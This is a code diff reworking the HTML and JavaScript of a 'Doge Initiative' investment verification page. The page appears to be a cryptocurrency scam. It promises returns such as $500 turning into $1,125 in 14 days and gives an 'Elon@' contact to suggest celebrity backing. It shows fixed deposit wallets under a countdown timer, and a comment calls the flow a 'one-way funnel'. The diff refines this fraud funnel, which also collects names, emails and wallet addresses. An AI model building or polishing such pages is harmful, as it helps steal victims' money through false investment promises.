@@ -1,26 +1,12 @@
 <!DOCTYPE html>
-<html lang="en" >
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Doge Initiative — Investment Verification</title>
+  <title>Doge Initiative — Verify Investment</title>
   <link rel="icon" href="favicon.ico" type="image/x-icon" />
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background: #000;
-      color: #f0f0f0;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      padding: 1rem;
-    }
+    /* Navbar styles consistent with index */
     nav {
       position: sticky;
       top: 0;
@@ -34,6 +20,9 @@
       backdrop-filter: blur(5px);
       z-index: 100;
       margin-bottom: 1rem;
+      box-sizing: border-box;
+      margin-left: auto;
+      margin-right: auto;
     }
     .logo {
       font-size: 1.8rem;
@@ -43,6 +32,7 @@
       align-items: center;
       gap: 0.5rem;
       cursor: pointer;
+      user-select: none;
     }
     .logo span {
       font-size: 2rem;
@@ -51,160 +41,209 @@
       display: flex;
       gap: 2rem;
       list-style: none;
+      padding-left: 0;
+      margin: 0;
     }
     nav a {
       font-weight: 600;
       color: #ffd700;
       text-decoration: none;
       cursor: pointer;
+      user-select: none;
     }
     nav a:hover {
       color: #fff;
     }
 
+    body {
+      background: #000;
+      color: #f0f0f0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      min-height: 100vh;
+      margin: 0;
+      padding: 0 1rem 3rem;
+      box-sizing: border-box;
+      max-width: 960px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
     h1 {
-      color: #f7b500;
+      font-size: 2.5rem;
       margin-bottom: 1rem;
+      color: #f7b500;
       text-align: center;
     }
-    h2 {
-      color: #ffd700;
-      margin-bottom: 0.5rem;
+
+    .instructions {
+      margin-bottom: 2rem;
+      text-align: center;
+      font-size: 1.1rem;
+      color: #ccc;
+      max-width: 600px;
+      margin-left: auto;
+      margin-right: auto;
     }
+
     .section {
-      background: rgba(17, 17, 17, 0.85);
+      margin-bottom: 2rem;
+    }
+
+    .option-grid {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .option-card {
+      background: rgba(17,17,17,0.85);
+      border-radius: 10px;
+      padding: 1.25rem 1rem;
+      flex: 1 1 160px;
+      cursor: pointer;
+      user-select: none;
+      box-shadow: 0 0 10px #f7b500aa;
+      text-align: center;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .option-card:hover {
+      transform: translateY(-6px);
+      box-shadow: 0 0 20px #ffd700bb;
+    }
+    .option-card.selected {
+      border: 2px solid #ffd700;
+      box-shadow: 0 0 25px #ffd700ee;
+      transform: translateY(-6px);
+    }
+    .option-card.disabled {
+      pointer-events: none;
+      opacity: 0.4;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .option-card h3 {
+      margin-bottom: 0.5rem;
+      color: #ffd700;
+      font-weight: 700;
+      font-size: 1.2rem;
+    }
+
+    .option-card p {
+      color: #ddd;
+      font-weight: 600;
+    }
+
+    #wallet-section {
+      display: none;
+      background: rgba(17,17,17,0.85);
       padding: 1.5rem;
       border-radius: 10px;
-      margin-bottom: 1.5rem;
-      max-width: 480px;
-      width: 100%;
-      box-shadow: 0 0 15px #ffd700aa;
+      text-align: center;
+      box-shadow: 0 0 20px #f7b500cc;
     }
-    .btn {
+
+    #wallet-address {
+      font-family: monospace;
+      font-size: 1.1rem;
+      background: #111;
+      padding: 0.75rem 1rem;
+      border-radius: 5px;
+      user-select: all;
+      margin-bottom: 1rem;
+      cursor: pointer;
+      color: #ffd700;
+    }
+
+    #countdown-timer {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #f7b500;
+    }
+
+    button {
       background: #f7b500;
       border: none;
       border-radius: 50px;
+      padding: 1rem 2rem;
+      font-weight: 700;
       color: #000;
-      font-weight: bold;
-      padding: 0.8rem 2rem;
-      cursor: pointer;
-      transition: transform 0.2s;
       font-size: 1.1rem;
-      width: 100%;
-      margin-top: 1rem;
-    }
-    .btn:hover:not(:disabled) {
-      transform: scale(1.05);
-    }
-    .btn:disabled {
-      cursor: not-allowed;
-      opacity: 0.6;
-    }
-    .option-list {
-      display: flex;
-      gap: 1rem;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-    .option-card {
-      flex: 1 1 140px;
-      background: #222;
-      border-radius: 8px;
-      padding: 1rem;
       cursor: pointer;
-      text-align: center;
-      transition: background-color 0.3s, box-shadow 0.3s;
       user-select: none;
-      border: 2px solid transparent;
-    }
-    .option-card.selected {
-      background: #ffd700;
-      color: #000;
-      border-color: #f7b500;
-      box-shadow: 0 0 15px #ffd700aa;
-      font-weight: bold;
-    }
-    .wallet-section {
       margin-top: 1rem;
-      background: #111;
-      border-radius: 8px;
-      padding: 1rem;
-      text-align: center;
-      user-select: all;
-      font-family: monospace;
-      font-size: 1rem;
-      cursor: pointer;
-      position: relative;
-      box-shadow: 0 0 10px #f7b500aa inset;
+      box-shadow: 0 0 15px #f7b500cc;
+      transition: background-color 0.2s ease;
     }
-    .wallet-label {
-      font-weight: bold;
-      margin-bottom: 0.5rem;
-      font-size: 1.1rem;
+    button:hover:not(:disabled) {
+      background-color: #ffd700;
     }
-    .timer {
-      margin-top: 1rem;
-      font-size: 1.2rem;
-      font-weight: bold;
-      color: #ffd700;
-      letter-spacing: 2px;
+    button:disabled {
+      cursor: not-allowed;
+      opacity: 0.5;
     }
-    form {
-      margin-top: 1.5rem;
-      display: flex;
-      flex-direction: column;
-      gap: 1rem;
+
+    #form-section {
+      display: none;
+      background: rgba(17,17,17,0.85);
+      padding: 1.5rem;
+      border-radius: 10px;
+      max-width: 480px;
+      margin: 1rem auto 0;
+      box-shadow: 0 0 20px #f7b500cc;
     }
-    label {
-      font-weight: 600;
-      font-size: 0.95rem;
-      text-align: left;
+
+    #form-section label {
       display: block;
-      margin-bottom: 0.3rem;
+      margin-bottom: 0.25rem;
+      font-weight: 600;
+      color: #ffd700;
     }
-    input {
-      padding: 0.7rem 1rem;
-      border-radius: 6px;
+
+    #form-section input {
+      width: 100%;
+      padding: 0.5rem;
+      margin-bottom: 1rem;
+      border-radius: 5px;
       border: none;
       font-size: 1rem;
-      width: 100%;
+      font-family: monospace;
+      box-sizing: border-box;
     }
-    input:focus {
-      outline: 2px solid #ffd700;
-      background: #222;
-      color: #fff;
-    }
-    .confirmation-message {
-      background: #1f3b00;
-      color: #b9f200;
-      font-weight: bold;
-      padding: 1rem;
-      border-radius: 8px;
+
+    #confirmation-message {
+      display: none;
       text-align: center;
-      box-shadow: 0 0 10px #b9f200aa;
-      max-width: 480px;
       margin-top: 2rem;
+      font-weight: 700;
+      font-size: 1.25rem;
+      color: #4ade80;
+      text-shadow: 0 0 5px #4ade80aa;
     }
-    .footer {
-      margin-top: auto;
-      text-align: center;
-      padding: 1rem 0;
-      font-size: 0.9rem;
-      color: #999;
-      max-width: 960px;
-      width: 100%;
+
+    footer {
+      margin-top: 3rem;
+      padding-top: 1rem;
       border-top: 1px solid #222;
+      font-size: 0.9rem;
+      text-align: center;
+      color: #999;
+      user-select: none;
     }
-    .footer a {
+
+    footer a {
       color: #ffd700;
       text-decoration: none;
-      font-weight: bold;
+    }
+    footer a:hover {
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
   <nav>
-    <div class="logo" onclick="location.href='index.html'"><span>🚀</span>Doge Initiative</div>
+    <div class="logo"><span>🚀</span> Doge Initiative</div>
     <ul>
       <li><a href="index.html">HOME</a></li>
       <li><a href="verify.html" style="font-weight:bold; color:#fff;">VERIFY</a></li>
@@ -213,158 +252,122 @@
     </ul>
   </nav>
 
-  <h1>Doge Initiative — Investment Verification</h1>
+  <main>
+    <h1>Verify Your Investment</h1>
+    <p class="instructions">Follow the steps below to securely invest and receive your payout.</p>
 
-  <!-- Step 1: Select Tier -->
-  <div class="section" id="tier-section">
-    <h2>Step 1: Choose Your Investment Tier</h2>
-    <div class="option-list" id="tier-options">
-      <div class="option-card" data-tier="Basic">$500 → $1,125 (14 days)</div>
-      <div class="option-card" data-tier="Gold">$1,000 → $2,700 (Priority)</div>
-      <div class="option-card" data-tier="Platinum">$2,500+ → $7,200 (AI Multiplier)</div>
+    <div class="section">
+      <h2>Select Your Tier</h2>
+      <div id="tier-options" class="option-grid">
+        <div class="option-card" data-tier="basic">
+          <h3>Basic Tier</h3>
+          <p>$500 → $1,125 (14 days)</p>
+        </div>
+        <div class="option-card" data-tier="gold">
+          <h3>Gold Tier</h3>
+          <p>$1,000 → $2,700 (Priority)</p>
+        </div>
+        <div class="option-card" data-tier="platinum">
+          <h3>Platinum Tier</h3>
+          <p>$2,500+ → $7,200 (AI Multiplier)</p>
+        </div>
+      </div>
     </div>
-  </div>
 
-  <!-- Step 2: Select Coin -->
-  <div class="section" id="coin-section" style="display:none;">
-    <h2>Step 2: Select Cryptocurrency</h2>
-    <div class="option-list" id="coin-options">
-      <div class="option-card" data-coin="DOGE">🐕 Dogecoin (DOGE)</div>
-      <div class="option-card" data-coin="BTC">₿ Bitcoin (BTC)</div>
-      <div class="option-card" data-coin="SOL">🪐 Solana (SOL)</div>
-      <div class="option-card" data-coin="USDT">🪙 USDT (ERC20)</div>
+    <div class="section">
+      <h2>Select Cryptocurrency</h2>
+      <div id="coin-options" class="option-grid">
+        <div class="option-card" data-coin="doge">Dogecoin</div>
+        <div class="option-card" data-coin="btc">Bitcoin</div>
+        <div class="option-card" data-coin="sol">Solana</div>
+        <div class="option-card" data-coin="usdt">USDT (ERC20)</div>
+      </div>
     </div>
-  </div>
 
-  <!-- Step 3: Wallet Reveal + Timer + "I Have Sent" button -->
-  <div class="section" id="wallet-section" style="display:none;">
-    <h2>Step 3: Send Your Deposit</h2>
-    <div class="wallet-label">Deposit Wallet Address (click to copy)</div>
-    <div class="wallet-section" id="wallet-address" title="Click to copy"></div>
-    <div class="timer" id="countdown-timer">10:00</div>
-    <button class="btn" id="sent-button" style="margin-top: 1rem;">I Have Sent</button>
-  </div>
+    <div id="wallet-section" class="section">
+      <h2>Send Deposit To This Wallet</h2>
+      <div id="wallet-address" title="Click to copy"></div>
+      <div>⏳ Transaction Verification Timer: <span id="countdown-timer">10:00</span></div>
+      <button id="sent-button">I Have Sent</button>
+    </div>
 
-  <!-- Step 4: User Form -->
-  <div class="section" id="form-section" style="display:none;">
-    <h2>Step 4: Confirm Your Deposit</h2>
-    <form id="verification-form">
-      <label for="name">Full Name</label>
-      <input type="text" id="name" name="name" placeholder="Your full name" required />
+    <div id="form-section" class="section">
+      <h2>Verification Form</h2>
+      <form id="verification-form">
+        <label for="name">Full Name</label>
+        <input type="text" id="name" name="name" placeholder="Your full name" required autocomplete="name" />
+        <label for="email">Email Address</label>
+        <input type="email" id="email" name="email" placeholder="you@example.com" required autocomplete="email" />
+        <label for="payout-wallet">Your Payout Wallet Address</label>
+        <input type="text" id="payout-wallet" name="payout-wallet" placeholder="Your crypto wallet address" required autocomplete="off" />
+        <button type="submit">Submit Verification</button>
+      </form>
+    </div>
 
-      <label for="email">Email Address</label>
-      <input type="email" id="email" name="email" placeholder="you@example.com" required />
+    <div id="confirmation-message" class="section">
+      Thank you! Your investment verification is pending. Please check your email for further instructions.
+    </div>
+  </main>
 
-      <label for="payout-wallet">Your Payout Wallet Address</label>
-      <input
-        type="text"
-        id="payout-wallet"
-        name="payoutWallet"
-        placeholder="Enter your wallet address for payouts"
-        required
-      />
-
-      <button type="submit" class="btn">Submit Verification</button>
-    </form>
-  </div>
-
-  <!-- Confirmation message -->
-  <div class="confirmation-message" id="confirmation-message" style="display:none;">
-    Verification pending... please check your email for next steps.
-  </div>
-
-  <div class="footer">
-    📞 Need help? Text: 707-276-6407 • Email: <a href="mailto:contact@doge-initiative.org">contact@doge-initiative.org</a> | Emergency: <a href="mailto:Elon@doge-initiative.org">Elon@doge-initiative.org</a>
-  </div>
+  <footer>
+    📞 Need help? Text: 707-276-6407 • Email: <a href="mailto:contact@doge-initiative.org">contact@doge-initiative.org</a><br />
+    Emergency: <a href="mailto:Elon@doge-initiative.org">Elon@doge-initiative.org</a>
+  </footer>
 
   <script>
-    // Wallet addresses
+    // Wallet addresses fixed, one-way funnel
     const wallets = {
-      DOGE: "D91ME9KqahFu7LLySpr3nPGYY1iheCu8WX",
-      BTC: "bc1qxvjz6kv84awx29p75qhn7qgxtwq4xt3phc7q26",
-      SOL: "3F2D7izX8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz",
-      USDT: "0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4",
+      doge: "D91ME9KqahFu7LLySpr3nPGYY1iheCu8WX",
+      btc: "bc1qxvjz6kv84awx29p75qhn7qgxtwq4xt3phc7q26",
+      sol: "3F2D7izX8gYkSwXwSyWoKB1dob53MDMCxqBVpPUEc8sz",
+      usdt: "0x1a670b57855dE6cED8Cf659Eea8BDDcB0F4C5FE4"
     };
-
-    // UI elements
-    const tierSection = document.getElementById("tier-section");
-    const coinSection = document.getElementById("coin-section");
-    const walletSection = document.getElementById("wallet-section");
-    const formSection = document.getElementById("form-section");
-    const confirmationMessage = document.getElementById("confirmation-message");
 
     const tierOptions = document.getElementById("tier-options");
     const coinOptions = document.getElementById("coin-options");
+    const walletSection = document.getElementById("wallet-section");
     const walletAddressDiv = document.getElementById("wallet-address");
     const countdownTimer = document.getElementById("countdown-timer");
-    const verificationForm = document.getElementById("verification-form");
     const sentButton = document.getElementById("sent-button");
+    const formSection = document.getElementById("form-section");
+    const verificationForm = document.getElementById("verification-form");
+    const confirmationMessage = document.getElementById("confirmation-message");
 
     let selectedTier = null;
     let selectedCoin = null;
     let countdownInterval = null;
     let countdownSeconds = 600; // 10 minutes
 
-    // Helper: clear selection styling
+    // Helper: clear selected class
     function clearSelection(container) {
       container.querySelectorAll(".option-card").forEach((el) => {
         el.classList.remove("selected");
       });
     }
 
-    // Tier selection
-    tierOptions.addEventListener("click", (e) => {
-      const card = e.target.closest(".option-card");
-      if (!card) return;
-      clearSelection(tierOptions);
-      card.classList.add("selected");
-      selectedTier = card.getAttribute("data-tier");
-      // Show coin section
-      coinSection.style.display = "block";
-      // Scroll to coin section
-      coinSection.scrollIntoView({ behavior: "smooth" });
-    });
+    // Disable tier and coin selections + disable button after sent
+    function disableOptions() {
+      tierOptions.querySelectorAll(".option-card").forEach((el) => el.classList.add("disabled"));
+      coinOptions.querySelectorAll(".option-card").forEach((el) => el.classList.add("disabled"));
+      sentButton.disabled = true;
+    }
 
-    // Coin selection
-    coinOptions.addEventListener("click", (e) => {
-      const card = e.target.closest(".option-card");
-      if (!card) return;
-      clearSelection(coinOptions);
-      card.classList.add("selected");
-      selectedCoin = card.getAttribute("data-coin");
+    // Timer display update
+    function updateTimerDisplay(seconds) {
+      const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
+      const ss = String(seconds % 60).padStart(2, "0");
+      countdownTimer.textContent = `${mm}:${ss}`;
+    }
 
-      // Show wallet section
-      walletSection.style.display = "block";
-      formSection.style.display = "none";
-      confirmationMessage.style.display = "none";
-
-      // Show wallet address
-      walletAddressDiv.textContent = wallets[selectedCoin];
-      // Reset timer
-      resetTimer();
-      startTimer();
-
-      walletSection.scrollIntoView({ behavior: "smooth" });
-    });
-
-    // Copy wallet address on click
-    walletAddressDiv.addEventListener("click", () => {
-      const text = walletAddressDiv.textContent;
-      navigator.clipboard.writeText(text).then(() => {
-        alert("Wallet address copied to clipboard!");
-      });
-    });
-
-    // Timer functions
+    // Start countdown timer
     function startTimer() {
-      countdownSeconds = 600; // 10 minutes
+      countdownSeconds = 600;
       updateTimerDisplay(countdownSeconds);
       if (countdownInterval) clearInterval(countdownInterval);
       countdownInterval = setInterval(() => {
         countdownSeconds--;
         if (countdownSeconds <= 0) {
           clearInterval(countdownInterval);
-          // After timer ends, just keep the wallet + allow "I Have Sent" click
           countdownTimer.textContent = "00:00";
         } else {
           updateTimerDisplay(countdownSeconds);
@@ -372,48 +375,89 @@
       }, 1000);
     }
 
-    function resetTimer() {
-      if (countdownInterval) clearInterval(countdownInterval);
-      countdownTimer.textContent = "10:00";
-    }
+    // Tier selection
+    tierOptions.addEventListener("click", (e) => {
+      const card = e.target.closest(".option-card");
+      if (!card || card.classList.contains("disabled")) return;
 
-    // "I Have Sent" button click: hide wallet, show form
-    sentButton.addEventListener("click", () => {
-      if (!selectedTier || !selectedCoin) {
-        alert("Please select a tier and coin first.");
+      clearSelection(tierOptions);
+      card.classList.add("selected");
+      selectedTier = card.getAttribute("data-tier");
+
+      // Reset everything downstream
+      clearSelection(coinOptions);
+      selectedCoin = null;
+      walletSection.style.display = "none";
+      formSection.style.display = "none";
+      confirmationMessage.style.display = "none";
+      sentButton.disabled = false;
+    });
+
+    // Coin selection (only allowed if tier selected)
+    coinOptions.addEventListener("click", (e) => {
+      if (!selectedTier) {
+        alert("Please select an investment tier first.");
         return;
       }
-      // Stop timer
-      if (countdownInterval) clearInterval(countdownInterval);
+      const card = e.target.closest(".option-card");
+      if (!card || card.classList.contains("disabled")) return;
 
-      walletSection.style.display = "none";
+      clearSelection(coinOptions);
+      card.classList.add("selected");
+      selectedCoin = card.getAttribute("data-coin");
+
+      walletAddressDiv.textContent = wallets[selectedCoin];
+      walletSection.style.display = "block";
+      formSection.style.display = "none";
+      confirmationMessage.style.display = "none";
+      sentButton.disabled = false;
+
+      // Reset timer if already running
+      if (countdownInterval) {
+        clearInterval(countdownInterval);
+        countdownTimer.textContent = "10:00";
+      }
+    });
+
+    // Copy wallet address on click
+    walletAddressDiv.addEventListener("click", () => {
+      if (!walletAddressDiv.textContent) return;
+      navigator.clipboard.writeText(walletAddressDiv.textContent).then(() => {
+        alert("Wallet address copied to clipboard!");
+      });
+    });
+
+    // "I Have Sent" button logic
+    sentButton.addEventListener("click", () => {
+      if (!selectedTier || !selectedCoin) {
+        alert("Please select both an investment tier and cryptocurrency.");
+        return;
+      }
+      sentButton.disabled = true;
+
+      // Disable tier and coin options to lock choices
+      disableOptions();
+
+      // Start 10-minute timer countdown
+      startTimer();
+
+      // Show the verification form
       formSection.style.display = "block";
+
+      // Scroll to form smoothly
       formSection.scrollIntoView({ behavior: "smooth" });
     });
 
-    // Form submission
+    // Verification form submit handler
     verificationForm.addEventListener("submit", (e) => {
       e.preventDefault();
 
-      // For demo, simulate submission success
-      formSection.style.display = "none";
+      // Simulate sending data to backend (for now just show confirmation)
+      verificationForm.style.display = "none";
       confirmationMessage.style.display = "block";
-      confirmationMessage.scrollIntoView({ behavior: "smooth" });
 
-      // TODO: You can add backend form submission here
-      // For now, just reset selections after a delay
-      setTimeout(() => {
-        selectedTier = null;
-        selectedCoin = null;
-        clearSelection(tierOptions);
-        clearSelection(coinOptions);
-        confirmationMessage.style.display = "none";
-        tierSection.style.display = "block";
-        coinSection.style.display = "none";
-        walletSection.style.display = "none";
-        formSection.style.display = "none";
-        window.scrollTo({ top: 0, behavior: "smooth" });
-      }, 15000);
+      // Scroll confirmation message into view
+      confirmationMessage.scrollIntoView({ behavior: "smooth" });
     });
   </script>
 </body>
